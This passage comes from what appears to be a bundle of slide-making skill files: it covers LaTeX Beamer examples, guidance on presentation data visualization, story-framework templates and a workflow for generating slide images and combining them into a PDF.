Definitions\n```latex\n\\newtheorem{theorem}{Theorem}[section]\n\\newtheorem{definition}{Definition}[section]\n\n\\begin{frame}{Key Theorem}\n\n\\begin{theorem}\nIf conditions A and B hold, then result C follows.\n\\end{theorem}\n\n\\begin{proof}\nThe proof follows from...\n\\end{proof}\n\n\\end{frame}\n```\n\n## Code Listings\n\n### Syntax Highlighting\n```latex\n\\lstset{\n  language=Python,\n  basicstyle=\\ttfamily,\n  keywordstyle=\\color{blue},\n  stringstyle=\\color{red},\n  commentstyle=\\color{green}\n}\n\n\\begin{frame}{Algorithm}\n\n\\lstinputlisting[language=Python]{code.py}\n\n\\end{frame}\n```\n\n### Inline Code\n```latex\n\\begin{frame}{Implementation}\n\nThe function \\texttt{train\\_model()} performs:\n\n\\begin{enumerate}\n  \\item Load data\n  \\item Initialize weights\n  \\item Train for epochs\n\\end{enumerate}\n\n\\end{frame}\n```\n\n## Figures and Tables\n\n### Including Figures\n```latex\n\\begin{frame}{Results}\n\n\\begin{figure}\n  \\centering\n  \\includegraphics[width=0.7\\textwidth]{experiment_results.png}\n  \\caption{Experimental Results}\n  \\label{fig:results}\n\\end{figure}\n\n\\end{frame}\n```\n\n### Tables\n```latex\n\\begin{frame}{Comparison}\n\n\\begin{table}\n  \\caption{Model Performance}\n  \\begin{tabular}{|l|c|c|}\n    \\hline\n    Model & Accuracy & F1-Score \\\\\n    \\hline\n    Baseline & 0.85 & 0.82 \\\\\n    Proposed & 0.92 & 0.89 \\\\\n    \\hline\n  \\end{tabular}\n\\end{table}\n\n\\end{frame}\n```\n\n## Animations and Overlays\n\nBeamer supports sophisticated animations:\n\n### Itemize Animation\n```latex\n\\begin{frame}{Progressive Disclosure}\n\n\\begin{itemize}\n  \\item<1-> Point 1 (appears on slide 1)\n  \\item<2-> Point 2 (appears on slide 2)\n  \\item<3-> Point 3 (appears on slide 3)\n\\end{itemize}\n\n\\end{frame}\n```\n\n### Reveal Equations\n```latex\n\\begin{frame}{Derivation}\n\n\\begin{align}\n  f(x) &= x^2 + 2x + 1 \\\\\n  \\uncover<2->{&= (x+1)^2} \\\\\n  \\uncover<3->{&= \\text{perfect square}}\n\\end{align}\n\n\\end{frame}\n```\n\n## Themes and Customization\n\n### Theme Combinations\n\nPopular combinations:\n- `Madrid` + `beaver` (dark blue, professional)\n- `Singapore` + `whale` (dark gray, clean)\n- `Copenhagen` + `seahorse` (light, colorful)\n- `Berkeley` + `albatross` (light, green accents)\n\n### Custom Colors\n```latex\n\\setbeamercolor{title}{fg=darkblue}\n\\setbeamercolor{author}{fg=gray}\n\\setbeamercolor{institute}{fg=lightgray}\n\\setbeamercolor{date}{fg=lightgray}\n```\n\n### Custom Font Sizes\n```latex\n\\setbeamerfont{title}{size=\\Large}\n\\setbeamerfont{author}{size=\\normalsize}\n\\setbeamerfont{institute}{size=\\small}\n```\n\n## Tips and Best Practices\n\n1. **Compile Twice**: LaTeX needs two passes for proper cross-references\n2. **Use `\\pause`**: For simple progressive disclosure\n3. **Limit Text**: Keep slides minimal, let equations shine\n4. **Consistent Spacing**: Use `\\vfill` to distribute content vertically\n5. **Reference Labels**: Use `\\label{}` and `\\ref{}` for navigation\n6. **Backup Slides**: Use `\\appendix` for backup material\n\n## Troubleshooting\n\n### Compilation Issues\n- **Missing packages**: Add `\\usepackage{package_name}` to preamble\n- **Font errors**: Use `\\usepackage[T1]{fontenc}` for better font support\n- **Figure not found**: Check file path and extensions\n\n### Layout Issues\n- **Text too small**: Increase `\\documentclass[14pt]{beamer}` point size\n- **Figures too large**: Use `\\includegraphics[width=0.8\\textwidth]{file}`\n- **Page breaks**: Use `\\newpage` or `\\clearpage`\n\n## References\n\nFor complete LaTeX Beamer documentation, see:\n- `references/beamer_guide.md`: Comprehensive guide with all features\n- See `assets/` for ready-to-use templates (e.g., `beamer_template_conference.tex`)\n- LaTeX Beamer User Guide: Official documentation\n\n## Quick Start\n\n1. Choose template: `assets/beamer_template_conference.tex`\n2. Customize theme: `\\usetheme{Madrid}`\n3. Add content: equations, algorithms, figures\n4. Compile: `pdflatex presentation.tex`\n5. Review and iterate\n\nBeamer is ideal for technical presentations requiring precise mathematical formatting.\n",
        "plugins/sys-research/skills/architecting-slides/references/data_visualization_slides.md": "# Data Visualization for Slides\n\n## Overview\n\nEffective data visualization in presentations differs fundamentally from journal figures. While publications prioritize comprehensive detail, presentation slides must emphasize clarity, impact, and immediate comprehension. This guide covers adapting figures for slides, choosing appropriate chart types, and avoiding common visualization mistakes.\n\n## Key Principles for Presentation Figures\n\n### 1. Simplify, Don't Replicate\n\n**The Core Difference**:\n- **Journal figures**: Dense, detailed, for careful study\n- **Presentation figures**: Clear, simplified, for quick understanding\n\n**Simplification Strategies**:\n\n**Remove Non-Essential Elements**:\n- BAD Minor gridlines\n- BAD Detailed legends (label directly instead)\n- BAD Multiple panels (split into separate slides)\n- BAD Secondary axes (rarely work in presentations)\n- BAD Dense tick marks and minor labels\n\n**Focus on Key Message**:\n- Show only the data supporting your current point\n- Subset data if full dataset is overwhelming\n- Highlight the specific comparison you're discussing\n- Remove context that isn't immediately relevant\n\n**Example Transformation**:\n```\nJournal Figure:\n- 6 panels (A-F)\n- 4 experimental conditions per panel\n- 50+ data points visible\n- Complex statistical annotations\n- Small font labels\n\nPresentation Version:\n- 3 separate slides (1-2 panels each)\n- Focus on key comparison per slide\n- Large, clear data representation\n- One statistical result highlighted\n- Large, readable labels\n```\n\n### 2. Emphasize Visual Hierarchy\n\n**Guide Attention**:\n- Make key result visually dominant\n- De-emphasize background or comparison data\n- Use size, color, and position strategically\n\n**Techniques**:\n\n**Color Emphasis**:\n```\nMain Result: Bold, saturated color (e.g., blue)\nComparison: Muted gray or desaturated color\nBackground: Very light gray or white\n```\n\n**Size Emphasis**:\n```\nKey line/bar: Thicker (3-4pt)\nReference lines: Thinner (1-2pt)\nGrid lines: Very thin (0.5pt) or remove\n```\n\n**Annotation**:\n```\nAdd text callouts: \"34% increase\" with arrow\nAdd shapes: Circle key region\nAdd color highlights: Background shading for important area\n```\n\n### 3. Maximize Readability\n\n**Font Sizes for Presentations**:\n- **Axis labels**: 18-24pt minimum\n- **Tick labels**: 16-20pt minimum\n- **Title**: 24-32pt\n- **Legend**: 16-20pt (or label directly on plot)\n- **Annotations**: 18-24pt\n\n**The Distance Test**:\n- If your figure isn't readable at 2-3 feet from your laptop screen, it won't work in a presentation\n- Test by stepping back from screen\n- Better to split into multiple simpler figures\n\n**Line and Marker Sizes**:\n- **Lines**: 2-4pt thickness (thicker than journal figures)\n- **Markers**: 8-12pt size\n- **Error bars**: 1.5-2pt thickness\n- **Bars**: Adequate width with clear spacing\n\n### 4. Use Progressive Disclosure\n\n**Build Complex Figures Incrementally**:\n\nInstead of showing complete figure at once:\n1. **Baseline**: Show axes and basic setup\n2. **Data Group 1**: Add first dataset\n3. **Data Group 2**: Add comparison dataset\n4. **Highlight**: Emphasize key difference\n5. **Interpretation**: Add annotation with finding\n\n**Benefits**:\n- Controls audience attention\n- Prevents information overload\n- Guides interpretation\n- Emphasizes narrative structure\n\n**Implementation**:\n- PowerPoint: Use animation to reveal layers\n- Beamer: Use `\\pause` or overlays\n- Static: Create sequence of slides building the figure\n\n## Chart Types and When to Use Them\n\n### Bar Charts\n\n**Best For**:\n- Comparing discrete categories\n- Showing counts or frequencies\n- Highlighting differences between groups\n\n**Presentation Optimization**:\n```\nGOOD DO:\n- Large, clear bars with adequate spacing\n- Horizontal bars for long category names\n- Direct labeling on bars (not legend)\n- Order by value (highest to lowest) unless natural order exists\n- Start y-axis at zero for accurate visual comparison\n\nBAD DON'T:\n- Too many categories (max 8-10)\n- 3D bars (distorts perception)\n- Multiple grouped comparisons (split to separate slides)\n- Decorative patterns or gradients\n```\n\n**Example Enhancement**:\n```\nBefore: 12 categories, small fonts, legend\nAfter: Top 6 categories only, large fonts, direct labels, key bar highlighted\n```\n\n### Line Graphs\n\n**Best For**:\n- Trends over time\n- Continuous data relationships\n- Comparing trajectories\n\n**Presentation Optimization**:\n```\nGOOD DO:\n- Thick lines (2-4pt)\n- Distinct colors AND line styles (solid, dashed, dotted)\n- Direct line labeling (at end of lines, not legend)\n- Highlight key line with color/thickness\n- Minimal gridlines or none\n- Clear markers at data points\n\nBAD DON'T:\n- More than 4-5 lines per plot\n- Similar colors (ensure high contrast)\n- Small markers or thin lines\n- Cluttered with excess gridlines\n```\n\n**Time Series Tips**:\n- Mark key events or interventions with vertical lines\n- Annotate important time points\n- Use shaded regions for different phases\n\n### Scatter Plots\n\n**Best For**:\n- Relationships between two variables\n- Correlations\n- Distributions\n- Outliers\n\n**Presentation Optimization**:\n```\nGOOD DO:\n- Large, distinct markers (8-12pt)\n- Color code groups clearly\n- Show trendline if discussing correlation\n- Annotate key points (outliers, examples)\n- Report R or p-value directly on plot\n\nBAD DON'T:\n- Overplot (too many overlapping points)\n- Small markers\n- Multiple marker types that look similar\n- Missing scale information\n```\n\n**Overplotting Solutions**:\n- Transparency (alpha) for overlapping points\n- Hexbin or density plots for very large datasets\n- Random jitter for discrete data\n- Marginal distributions on axes\n\n### Box Plots / Violin Plots\n\n**Best For**:\n- Distribution comparisons\n- Showing variability and outliers\n- Multiple group comparisons\n\n**Presentation Optimization**:\n```\nGOOD DO:\n- Large, clear boxes\n- Color code groups\n- Add individual data points if n is small (< 30)\n- Annotate median or mean values\n- Explain components (quartiles, whiskers) first time shown\n\nBAD DON'T:\n- Assume audience knows box plot conventions\n- Use without brief explanation\n- Too many groups (max 6-8)\n- Omit axis labels and units\n```\n\n**First Use**:\nIf your audience may be unfamiliar, briefly explain: \"Box shows middle 50% of data, line is median, whiskers show range\"\n\n### Heatmaps\n\n**Best For**:\n- Matrix data\n- Gene expression or correlation patterns\n- Large datasets with patterns\n\n**Presentation Optimization**:\n```\nGOOD DO:\n- Large cells (readable grid)\n- Clear, intuitive color scale (diverging or sequential)\n- Label rows and columns with large fonts\n- Show color scale legend prominently\n- Cluster or order meaningfully\n- Highlight key region with border\n\nBAD DON'T:\n- Too many rows/columns (200200 matrix unreadable)\n- Poor color scales (rainbow, red-green)\n- Missing dendrograms if claiming clusters\n- Tiny labels\n```\n\n**Simplification**:\n- Show subset of most interesting rows/columns\n- Zoom to relevant region\n- Split large heatmap across multiple slides\n\n### Network Diagrams\n\n**Best For**:\n- Relationships and connections\n- Pathways and networks\n- Hierarchical structures\n\n**Presentation Optimization**:\n```\nGOOD DO:\n- Large nodes and labels\n- Clear edge directionality (arrows)\n- Color or size code importance\n- Highlight path of interest\n- Simplify to essential connections\n- Use layout that minimizes crossing edges\n\nBAD DON'T:\n- Show entire complex network at once\n- Hairball diagrams (too many connections)\n- Small labels on nodes\n- Unclear what nodes and edges represent\n```\n\n**Build Strategy**:\n1. Show simplified structure\n2. Add key nodes progressively\n3. Highlight path or subnetwork of interest\n4. Annotate with functional interpretation\n\n### Statistical Plots\n\n**Kaplan-Meier Survival Curves**:\n```\nGOOD Optimize:\n- Thick lines (3-4pt)\n- Show confidence intervals as shaded regions\n- Mark censored observations clearly\n- Report hazard ratio and p-value on plot\n- Extend axes to show full follow-up\n```\n\n**Forest Plots**:\n```\nGOOD Optimize:\n- Large markers (diamonds or squares)\n- Clear confidence interval bars\n- Large font for study names\n- Highlight overall estimate\n- Show line of no effect prominently\n```\n\n**ROC Curves**:\n```\nGOOD Optimize:\n- Thick curve line\n- Show diagonal reference line (AUC = 0.5)\n- Report AUC with confidence interval on plot\n- Mark optimal threshold if discussing cutpoint\n- Compare  3 curves per plot\n```\n\n## Color in Data Visualizations\n\n### Sequential Color Scales\n\n**When to Use**: Ordered data (low to high)\n\n**Good Palettes**:\n- Blues: Light blue  Dark blue\n- Greens: Light green  Dark green  \n- Grays: Light gray  Black\n- Viridis: Yellow  Purple (perceptually uniform)\n\n**Avoid**:\n- Rainbow scales (non-uniform perception)\n- Red-green scales (color blindness)\n\n### Diverging Color Scales\n\n**When to Use**: Data with meaningful midpoint (e.g., +/ change, correlation from -1 to +1)\n\n**Good Palettes**:\n- Blue  White  Red\n- Purple  White  Orange\n- Blue  Gray  Orange\n\n**Key Principle**: Midpoint should be visually neutral (white or light gray)\n\n### Categorical Colors\n\n**When to Use**: Distinct groups with no order\n\n**Good Practices**:\n- Maximum 5-7 colors for clarity\n- High contrast between adjacent categories\n- Color-blind safe combinations\n- Consistent color mapping across slides\n\n**Example Set**:\n```\nBlue (#0173B2)\nOrange (#DE8F05)\nGreen (#029E73)\nPurple (#CC78BC)\nRed (#CA3542)\n```\n\n### Highlight Colors\n\n**Strategy**: Use color to direct attention\n\n```\nMain Result: Bright, saturated color (e.g., blue)\nComparison: Neutral (gray) or muted color\nBackground: Very light gray or white\n```\n\n**Example Application**:\n- Bar chart: Key bar in blue, others in light gray\n- Line plot: Main line in bold blue, reference lines in thin gray\n- Scatter: Group of interest in color, others faded\n\n## Common Visualization Mistakes\n\n### Mistake 1: Overwhelming Complexity\n\n**Problem**: Showing too much data at once\n\n**Example**:\n- Figure with 12 panels\n- Each panel has 6 experimental conditions\n- Tiny fonts and dense layout\n- Audience has 10 seconds to process\n\n**Solution**:\n- Split into 3-4 slides\n- One comparison per slide\n- Focus on key result\n- Build understanding progressively\n\n### Mistake 2: Illegible Labels\n\n**Problem**: Text too small to read\n\n**Common Issues**:\n- 8-10pt axis labels (need 18pt)\n- Tiny legend text\n- Subscripts and superscripts disappear\n- Fine-print p-values\n\n**Solution**:\n- Recreate figures for presentation (don't use journal versions directly)\n- Test readability from distance\n- Remove or enlarge small text\n- Put detailed statistics in notes\n\n### Mistake 3: Chart Junk\n\n**Problem**: Unnecessary decorative elements\n\n**Examples**:\n- 3D effects on 2D data\n- Excessive gridlines\n- Distracting backgrounds\n- Decorative borders or shadows\n- Animation for decoration only\n\n**Solution**:\n- Remove all non-data ink\n- Maximize data-ink ratio\n- Clean, minimal design\n- Let data be the focus\n\n### Mistake 4: Misleading Scales\n\n**Problem**: Visual representation distorts data\n\n**Examples**:\n- Bar charts not starting at zero\n- Truncated y-axes exaggerating differences\n- Inconsistent scales between panels\n- Log scales without clear labeling\n\n**Solution**:\n- Bar charts: Always start at zero\n- Line charts: Can truncate, but make clear\n- Label log scales explicitly\n- Maintain consistent scales for comparisons\n\n### Mistake 5: Poor Color Choices\n\n**Problem**: Colors reduce clarity or accessibility\n\n**Examples**:\n- Red-green for color-blind audience\n- Low contrast (yellow on white)\n- Too many colors\n- Inconsistent color meaning\n\n**Solution**:\n- Use color-blind safe palettes\n- Test contrast (minimum 4.5:1)\n- Limit to 5-7 colors maximum\n- Consistent meaning across slides\n\n### Mistake 6: Missing Context\n\n**Problem**: Audience can't interpret visualization\n\n**Missing Elements**:\n- Axis labels or units\n- Sample sizes (n)\n- Error bar meaning (SEM vs SD vs CI)\n- Statistical significance indicators\n- Scale or reference points\n\n**Solution**:\n- Label everything clearly\n- Define abbreviations\n- Report key statistics on plot\n- Provide reference for comparison\n\n### Mistake 7: Inefficient Chart Type\n\n**Problem**: Wrong visualization for data type\n\n**Examples**:\n- Pie chart for >5 categories (use bar chart)\n- 3D pie chart (especially bad)\n- Dual y-axes (confusing)\n- Line plot for discrete categories (use bar chart)\n\n**Solution**:\n- Match chart type to data type\n- Consider what comparison you're showing\n- Choose format that makes pattern obvious\n- Test if message is immediately clear\n\n## Progressive Disclosure Techniques\n\n### Building a Complex Figure\n\n**Scenario**: Showing multi-panel experimental result\n\n**Approach 1: Sequential Panels**\n```\nSlide 1: Panel A only (baseline condition)\nSlide 2: Panels A+B (add treatment effect)\nSlide 3: Panels A+B+C (add time course)\nSlide 4: All panels with interpretation overlay\n```\n\n**Approach 2: Layered Data**\n```\nSlide 1: Axes and experimental design schematic\nSlide 2: Add control group data\nSlide 3: Add treatment group data\nSlide 4: Highlight difference, show statistics\n```\n\n**Approach 3: Zoom and Context**\n```\nSlide 1: Full dataset overview\nSlide 2: Zoom to interesting region\nSlide 3: Highlight specific points in zoomed view\n```\n\n### Animation vs. Multiple Slides\n\n**Use Animation** (PowerPoint/Beamer overlays):\n- Building bullet points\n- Adding layers to same plot\n- Highlighting different regions sequentially\n- Smooth transitions within a concept\n\n**Use Separate Slides**:\n- Different data or experiments\n- Major conceptual shifts\n- Want to return to previous view\n- Need to control timing flexibly\n\n## Figure Preparation Workflow\n\n### Step 1: Start with High-Quality Source\n\n**For Generated Figures**:\n- Export at high resolution (300 DPI minimum)\n- Vector formats preferred (PDF, SVG)\n- Large size (can scale down, not up)\n- Clean, professional appearance\n\n**For Published Figures**:\n- Request high-resolution versions from authors/publishers\n- Recreate if source not available\n- Check reuse permissions\n\n### Step 2: Simplify for Presentation\n\n**Edit in Graphics Software**:\n- Remove non-essential panels\n- Enlarge fonts and labels\n- Increase line widths and marker sizes\n- Remove or simplify legends\n- Add direct labels\n- Remove excess gridlines\n\n**Tools**:\n- Adobe Illustrator (vector editing)\n- Inkscape (free vector editing)\n- PowerPoint/Keynote (basic editing)\n- Python/R (programmatic recreation)\n\n### Step 3: Optimize for Projection\n\n**Check**:\n- GOOD Readable from 10 feet away\n- GOOD High contrast between elements\n- GOOD Large enough to fill significant slide area\n- GOOD Maintains quality when projected\n- GOOD Works in various lighting conditions\n\n**Test**:\n- View on different screens\n- Project if possible before talk\n- Print at small scale (simulates distance)\n- Check in grayscale (color-blind simulation)\n\n### Step 4: Add Context and Annotations\n\n**Enhancements**:\n- Arrows pointing to key features\n- Text boxes with key findings (\"p < 0.001\")\n- Circles or rectangles highlighting regions\n- Color coding matched to verbal description\n- Reference lines or benchmarks\n\n**Verbal Integration**:\n- Plan what you'll say about each element\n- Use \"Notice that...\" or \"Here you can see...\"\n- Point to specific features during talk\n- Explain axes and scales first time shown\n\n## Recreating Journal Figures for Presentations\n\n### When to Recreate\n\n**Recreate When**:\n- Original has small fonts\n- Too many panels for one slide\n- Multiple comparisons to parse\n- Colors not accessible\n- Data available to you\n\n**Reuse When**:\n- Already simple and clear\n- Appropriate font sizes\n- Single focused message\n- High resolution available\n- Remaking not feasible\n\n### Recreation Tools\n\n**Python (matplotlib, seaborn)**:\n```python\nimport matplotlib.pyplot as plt\nimport seaborn as sns\n\n# Set presentation-friendly defaults\nplt.rcParams['font.size'] = 18\nplt.rcParams['axes.linewidth'] = 2\nplt.rcParams['lines.linewidth'] = 3\nplt.rcParams['figure.figsize'] = (10, 6)\n\n# Create plot with large, clear elements\n# Export as high-res PNG or PDF\n```\n\n**R (ggplot2)**:\n```r\nlibrary(ggplot2)\n\n# Presentation theme\ntheme_presentation <- theme_minimal() +\n  theme(\n    text = element_text(size = 18),\n    axis.text = element_text(size = 16),\n    axis.title = element_text(size = 20),\n    legend.text = element_text(size = 16)\n  )\n\n# Apply to plots\nggplot(data, aes(x, y)) + geom_point(size=4) + theme_presentation\n```\n\n**GraphPad Prism**:\n- Increase font sizes in Format Axes\n- Thicken lines in Format Graph\n- Enlarge symbols\n- Export as high-resolution image\n\n**Excel/PowerPoint**:\n- Select chart, Format  Text Options  Size (increase to 18-24pt)\n- Format  Line  Width (increase to 2-3pt)\n- Format  Marker  Size (increase to 10-12pt)\n\n## Summary Checklist\n\nBefore including a figure in your presentation:\n\n**Clarity**:\n- [ ] One clear message per figure\n- [ ] Immediately understandable (< 5 seconds)\n- [ ] Appropriate chart type for data\n- [ ] Simplified from journal version (if applicable)\n\n**Readability**:\n- [ ] Font sizes 18pt for labels\n- [ ] Thick lines (2-4pt) and large markers (8-12pt)\n- [ ] High contrast colors\n- [ ] Readable from back of room\n\n**Design**:\n- [ ] Minimal chart junk (removed gridlines, simplify)\n- [ ] Axes clearly labeled with units\n- [ ] Color-blind friendly palette\n- [ ] Consistent style with other figures\n\n**Context**:\n- [ ] Sample sizes indicated (n)\n- [ ] Statistical results shown (p-values, CI)\n- [ ] Error bars defined (SE, SD, or CI?)\n- [ ] Key finding annotated or highlighted\n\n**Technical Quality**:\n- [ ] High resolution (300 DPI minimum)\n- [ ] Vector format preferred\n- [ ] Properly sized for slide\n- [ ] Quality maintained when projected\n\n**Progressive Disclosure** (if complex):\n- [ ] Plan for building figure incrementally\n- [ ] Each step adds one new element\n- [ ] Final version shows complete picture\n- [ ] Animation or separate slides prepared\n",
        "plugins/sys-research/skills/architecting-slides/references/frameworks.md": "# Story Frameworks\n\n## Framework 1: The Problem-Solution Story\n\n```markdown\n# Customer Churn Analysis\n\n## The Hook\n\"We're losing $2.4M annually to preventable churn.\"\n\n## The Context\n- Current churn rate: 8.5% (industry average: 5%)\n- Average customer lifetime value: $4,800\n- 500 customers churned last quarter\n\n## The Problem\nAnalysis of churned customers reveals a pattern:\n- 73% churned within first 90 days\n- Common factor: < 3 support interactions\n- Low feature adoption in first month\n\n## The Insight\n[Show engagement curve visualization]\nCustomers who don't engage in the first 14 days\nare 4x more likely to churn.\n\n## The Solution\n1. Implement 14-day onboarding sequence\n2. Proactive outreach at day 7\n3. Feature adoption tracking\n\n## Expected Impact\n- Reduce early churn by 40%\n- Save $960K annually\n- Payback period: 3 months\n\n## Call to Action\nApprove $50K budget for onboarding automation.\n```\n\n## Framework 2: The Trend Story\n\n```markdown\n# Q4 Performance Analysis\n\n## Where We Started\nQ3 ended with $1.2M MRR, 15% below target.\nTeam morale was low after missed goals.\n\n## What Changed\n[Timeline visualization]\n- Oct: Launched self-serve pricing\n- Nov: Reduced friction in signup\n- Dec: Added customer success calls\n\n## The Transformation\n[Before/after comparison chart]\n| Metric         | Q3     | Q4     | Change |\n|----------------|--------|--------|--------|\n| Trial  Paid   | 8%     | 15%    | +87%   |\n| Time to Value  | 14 days| 5 days | -64%   |\n| Expansion Rate | 2%     | 8%     | +300%  |\n\n## Key Insight\nSelf-serve + high-touch creates compound growth.\nCustomers who self-serve AND get a success call\nhave 3x higher expansion rate.\n\n## Going Forward\nDouble down on hybrid model.\nTarget: $1.8M MRR by Q2.\n```\n\n## Framework 3: The Comparison Story\n\n```markdown\n# Market Opportunity Analysis\n\n## The Question\nShould we expand into EMEA or APAC first?\n\n## The Comparison\n[Side-by-side market analysis]\n\n### EMEA\n- Market size: $4.2B\n- Growth rate: 8%\n- Competition: High\n- Regulatory: Complex (GDPR)\n- Language: Multiple\n\n### APAC\n- Market size: $3.8B\n- Growth rate: 15%\n- Competition: Moderate\n- Regulatory: Varied\n- Language: Multiple\n\n## The Analysis\n[Weighted scoring matrix visualization]\n\n| Factor      | Weight | EMEA Score | APAC Score |\n|-------------|--------|------------|------------|\n| Market Size | 25%    | 5          | 4          |\n| Growth      | 30%    | 3          | 5          |\n| Competition | 20%    | 2          | 4          |\n| Ease        | 25%    | 2          | 3          |\n| **Total**   |        | **2.9**    | **4.1**    |\n\n## The Recommendation\nAPAC first. Higher growth, less competition.\nStart with Singapore hub (English, business-friendly).\nEnter EMEA in Year 2 with localization ready.\n\n## Risk Mitigation\n- Timezone coverage: Hire 24/7 support\n- Cultural fit: Local partnerships\n- Payment: Multi-currency from day 1\n```\n",
        "plugins/sys-research/skills/architecting-slides/references/pdf_workflow.md": "# PDF Workflow Guide\n\nGenerate visually stunning presentations using Nano Banana Pro to create complete slide images, then combine into PDF.\n\n## Why PDF Workflow?\n\n**Advantages**:\n- Most visually impressive results\n- Fast creation (describe and generate)\n- No design skills required\n- Consistent, professional appearance\n- Perfect for general audiences\n\n**Best for**: Conference talks, business presentations, general scientific talks, pitch presentations\n\n## Step-by-Step Process\n\n### Step 1: Plan Each Slide\n\nCreate a detailed plan for your presentation:\n\n```markdown\n# Presentation Plan: Introduction to Machine Learning\n\n## Slide 1: Title Slide\n- Title: \"Machine Learning: From Theory to Practice\"\n- Subtitle: \"AI Conference 2025\"\n- Speaker: Dr. Jane Smith, University of XYZ\n- Visual: Modern abstract neural network background\n\n## Slide 2: Introduction\n- Title: \"Why Machine Learning Matters\"\n- Key points: Industry adoption, breakthrough applications, future potential\n- Visual: Icons showing different ML applications\n\n... (continue for all slides)\n```\n\n### Step 2: Generate Each Slide\n\nUse `generate_slide_image.py` to create each slide.\n\n**CRITICAL: Formatting Consistency Protocol**\n\nTo ensure unified formatting across all slides:\n\n1. **Define a Formatting Goal** at the start and include it in EVERY prompt:\n   - Color scheme (e.g., \"dark blue background, white text, gold accents\")\n   - Typography style (e.g., \"bold sans-serif titles, clean body text\")\n   - Visual style (e.g., \"minimal, professional, corporate aesthetic\")\n   - Layout approach (e.g., \"generous white space, left-aligned content\")\n\n2. **Always attach the previous slide** when generating subsequent slides using `--attach`:\n   - This allows Nano Banana Pro to see and match the existing style\n   - Creates visual continuity throughout the deck\n   - Ensures consistent colors, fonts, and design language\n\n3. **Default author is \"K-Dense\"** unless another name is specified\n\n4. **Include citations directly in the prompt** for slides that reference research:\n   - Add citations in the prompt text so they appear on the generated slide\n   - Use format: \"Include citation: (Author et al., Year)\" or \"Show reference: Author et al., Year\"\n   - For multiple citations, list them all in the prompt\n   - Citations should appear in small text at the bottom of the slide or near relevant content\n\n5. **Attach existing figures/data for results slides** (CRITICAL for data-driven presentations):\n   - When creating slides about results, ALWAYS check for existing figures\n   - Use `--attach` to include these figures so Nano Banana Pro can incorporate them\n   - When attaching data figures, describe what you want in the prompt\n   - Multiple figures can be attached: `--attach fig1.png --attach fig2.png`\n\n### Step 3: Combine to PDF\n\n```bash\n# Combine all slides into a PDF presentation\npython scripts/slides_to_pdf.py slides/*.png -o presentation.pdf\n```\n\n## Example Workflow\n\n```bash\n# Title slide (first slide - establishes the style)\npython scripts/generate_slide_image.py \"Title slide for presentation: 'Machine Learning: From Theory to Practice'. Subtitle: 'AI Conference 2025'. Speaker: K-Dense. FORMATTING GOAL: Dark blue background (#1a237e), white text, gold accents (#ffc107), minimal design, sans-serif fonts, generous margins, no decorative elements.\" -o slides/01_title.png\n\n# Content slide with citations (attach previous slide for consistency)\npython scripts/generate_slide_image.py \"Presentation slide titled 'Why Machine Learning Matters'. Three key points with simple icons: 1) Industry adoption, 2) Breakthrough applications, 3) Future potential. CITATIONS: Include at bottom in small text: (LeCun et al., 2015; Goodfellow et al., 2016). FORMATTING GOAL: Match attached slide style - dark blue background, white text, gold accents, minimal professional design, no visual clutter.\" -o slides/02_intro.png --attach slides/01_title.png\n\n# RESULTS SLIDE - Attach actual data figure from working directory\npython scripts/generate_slide_image.py \"Presentation slide titled 'Model Performance Results'. Create a slide presenting the attached accuracy chart. Key findings to highlight: 1) 95% accuracy achieved, 2) Outperforms baseline by 12%, 3) Consistent across test sets. CITATIONS: Include at bottom: (Our results, 2025). FORMATTING GOAL: Match attached slide style exactly.\" -o slides/04_results.png --attach slides/03_background.png --attach figures/accuracy_chart.png\n\n# Combine to PDF\npython scripts/slides_to_pdf.py slides/*.png -o presentation.pdf\n```\n\n## Prompt Template\n\nInclude these elements in every prompt (customize as needed):\n```\n[Slide content description]\nCITATIONS: Include at bottom: (Author1 et al., Year; Author2 et al., Year)\nFORMATTING GOAL: [Background color], [text color], [accent color], minimal professional design, no decorative elements, consistent with attached slide style.\n```\n\n## Script Options\n\n### generate_slide_image.py\n\n```bash\n# Full slide (default) - generates complete slide as image\npython scripts/generate_slide_image.py \"slide description\" -o output.png\n\n# Visual only - generates just the image/figure for embedding in PPT\npython scripts/generate_slide_image.py \"visual description\" -o output.png --visual-only\n\n# With reference images attached\npython scripts/generate_slide_image.py \"Create a slide explaining this chart\" -o slide.png --attach chart.png\npython scripts/generate_slide_image.py \"Combine these into a comparison slide\" -o compare.png --attach before.png --attach after.png\n```\n\n**Options:**\n- `-o, --output`: Output file path (required)\n- `--attach IMAGE`: Attach image file(s) as context for generation (can use multiple times)\n- `--visual-only`: Generate just the visual/figure, not a complete slide\n- `--iterations`: Max refinement iterations (default: 2)\n- `--api-key`: OpenRouter API key (or set OPENROUTER_API_KEY env var)\n- `-v, --verbose`: Verbose output\n\n### slides_to_pdf.py\n\n```bash\n# Combine PNG files\npython scripts/slides_to_pdf.py slides/*.png -o presentation.pdf\n\n# Combine specific files in order\npython scripts/slides_to_pdf.py title.png intro.png methods.png -o talk.pdf\n\n# From directory (sorted by filename)\npython scripts/slides_to_pdf.py slides/ -o presentation.pdf\n```\n\n**Options:**\n- `-o, --output`: Output PDF path (required)\n- `--dpi`: PDF resolution (default: 150)\n- `-v, --verbose`: Verbose output\n\n**Tip:** Name slides with numbers for correct ordering: `01_title.png`, `02_intro.png`, etc.\n\n## Environment Setup\n\n```bash\nexport OPENROUTER_API_KEY='your_api_key_here'\n# Get key at: https://openrouter.ai/keys\n```\n\n## Quick Start Example\n\nFor a 15-minute conference talk:\n\n1. **Plan** (30 minutes):\n   - Use research-lookup to find 8-12 relevant papers\n   - Build outline (intro  methods  2-3 key results  conclusion)\n   - Create detailed plan for each slide\n   - Target 15-18 slides\n\n2. **Generate** (1-2 hours):\n   - Use consistent formatting across all slides\n   - Attach previous slide each time\n   - Include citations where relevant\n\n3. **Review & Iterate** (30 minutes):\n   - Open PDF and review each slide\n   - Regenerate slides that need improvement\n\n4. **Practice** (2-3 hours):\n   - Practice 3-5 times with timer\n   - Aim for 13-14 minutes (leave buffer)\n\nTotal time: ~4-5 hours for quality presentation\n",
